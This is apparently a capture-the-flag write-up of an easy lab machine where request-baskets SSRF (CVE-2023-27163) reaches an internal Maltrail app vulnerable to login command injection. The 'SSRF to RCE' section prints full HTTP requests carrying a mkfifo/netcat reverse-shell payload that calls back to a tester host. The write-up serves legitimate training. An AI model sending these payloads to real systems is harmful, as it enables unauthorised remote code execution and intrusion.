Easy box which involved taking advantage of server side request forgery to access a web application hosted internally on port 80. The hosted web application was vulnerable to unauthenicated command injection. Escalation to root was also straightforward.

# Nmap scan

Port scan revealed 3 ports total. Port 80 which is usually a web server is filtered. Port 55555 is unknown and 22 is open hosting SSH as usual.

# Inspecting Port 55555 - HTTP application

No access to port 80. Accessing 55555 via web browser displays a page. An app called `request-baskets` is being hosted.

![f169617a43865663d26ca4d31877f955.png](/assets/img/f169617a43865663d26ca4d31877f955.png)

# CVE-2023-27163

After a quick google search it revealed the version of request-baskets hosted was vulnerable to SSRF. It may be possible to take advantage of this to access port 80 to see what its hosting.

Source: https://nvd.nist.gov/vuln/detail/CVE-2023-27163

request-baskets up to v1.2.1 was discovered to contain a Server-Side Request Forgery (SSRF) via the component `/api/baskets/{name}`. This vulnerability allows attackers to access network resources and sensitive information via a crafted API request.

# Exploiting requests-baskets

Below request was used to setup a basket which points to `localhost:80`. When the basket URL is accessed it should take advantage of the SSRF vulnerability.

```

# Discovering Mailtrail - Port 80

Accessing the basket loaded with the SSRF payload redirected the browser to `localhost:80`. It revealed an application called Mailtrail running. Next step will be to google any known exploits.

![748664a5ff2386b01063ef3a43529221.png](/assets/img/748664a5ff2386b01063ef3a43529221.png)

# Mailtrail command injection

It looks like the version running on port 80 is vulnerable to command injection. It will be necessary to send the request via the SSRF vulnerability as a GET request.  

Source: https://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/

Maltrail <= v0.54 is vulnerable to unauthenticated OS command injection during the login process.

The subprocess.check_output function in mailtrail/core/http.py contains a command injection vulnerability in the params.get("username")parameter.

An attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication.

# SSRF to RCE

This is what the final request looks like. First it will access port 80 locally via SSRF and then pass the vulnerable parameters within a GET request.

```
POST /api/baskets/payload1 HTTP/1.1
Host: 10.129.164.5:55555
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0

Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 149

{
    "forward_url":"http://localhost:80/login?username=%3b`rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.10+9001+>/tmp/f`'",
    "proxy_response": true,
    "insecure_tls": false,
    "expand_path": true,
    "capacity": 200
}
```

Accessing the basket URL should trigger the payload as shown below.

```
GET /payload1 HTTP/1.1
Host: 10.129.164.5:55555
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0

Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

It was also possible to use the interface of the website to achieve the same result.
